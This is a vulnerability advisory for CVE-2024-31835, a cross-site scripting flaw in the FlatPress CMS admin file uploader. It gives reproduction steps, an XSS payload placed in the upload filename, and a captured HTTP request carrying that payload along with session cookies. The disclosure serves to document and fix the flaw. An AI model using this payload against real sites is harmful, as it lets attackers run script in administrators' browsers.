# CVE-2024-31835
Cross Site Scripting vulnerability in flatpress CMS Flatpress v1.3 allows a remote attacker to execute arbitrary code via a craftedpayload to the file name parameter.

Affected Component:
FlatPress CMS Admin Panel File Upload Field

Fixed version:
Flatpress v1.3 - will be fixed in FlatPress version 1.3.

Attack Type: Remote

Attack Vectors: Exploit Vulnerability by crafting the Image filename

Step to Reproduce:

1.login admin account and open below URL http://127.0.0.1/flatpress-1.2.1/admin.php?p=uploader&action=mediamanager
2.click on upload field upload any file you want click on upload and intercept request with burpsuite the request will look like below inject javascript payload with filename ```test<img src=a onerror=alert(1)>test```


## Request Example

```http
POST /flatpress-1.2.1/admin.php?p=uploader&action=default HTTP/1.1
Host: 127.0.0.1
Content-Length: 1598
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzHnyH0cX0ojRbqom
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/flatpress-1.2.1/admin.php?p=uploader
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: fpuser_fp-9b0a379a=parag; fppass_fp-9b0a379a=%242y%2410%24j.D1Ab.xVMoIDu9yQF8QjefOZmz9JPoh4QwzpoCdYxlqSkNQDGag2; fpsess_fp-9b0a379a=mg65h4rd8onvv2tniminpq635f
Connection: close

------WebKitFormBoundaryzHnyH0cX0ojRbqom
Content-Disposition: form-data; name="_wpnonce"
60f24876be
------WebKitFormBoundaryzHnyH0cX0ojRbqom
Content-Disposition: form-data; name="_wp_http_referer"
/flatpress-1.2.1/admin.php?p=uploader
------WebKitFormBoundaryzHnyH0cX0ojRbqom
Content-Disposition: form-data; name="upload[]"; filename="test.phpuh9ae<img src=a onerror=alert(1)>airjipc8brr"
Content-Type: application/x-php

TEst
------WebKitFormBoundaryzHnyH0cX0ojRbqom--
```


Reference:

https://portswigger.net/web-security/cross-site-scripting
https://drive.google.com/file/d/1OthtP87MduNTYur_p0RZv3moY8CrBcaM/view

Vendor of Product:
flatpress CMS

Confirmed on: 11/06/2023

Discoverer:
Parag Bagul




